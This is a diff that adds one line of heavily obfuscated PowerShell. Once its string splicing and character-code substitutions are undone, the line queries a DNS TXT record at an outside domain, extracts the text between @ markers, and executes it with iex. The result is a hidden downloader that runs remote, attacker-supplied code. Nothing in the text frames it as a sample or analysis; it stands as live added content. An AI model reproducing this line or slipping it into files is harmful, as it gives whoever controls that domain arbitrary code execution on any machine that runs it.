@@ -1,0 +1,1 @@
+﻿ ('if(71Q71Q+('+'n'+'slooku'+'p -q=t'+'xt '+'p.s.rk.ns.rankingplac.'+'pl)'+' -match'+' '+'7'+'1Q@(.*)@'+'7'+'1Q){ie'+'x M'+'LPmatches['+'1]}').rePlace(([CHAR]77+[CHAR]76+[CHAR]80),[StRINg][CHAR]36).rePlace(([CHAR]55+[CHAR]49+[CHAR]81),[StRINg][CHAR]39) |iex
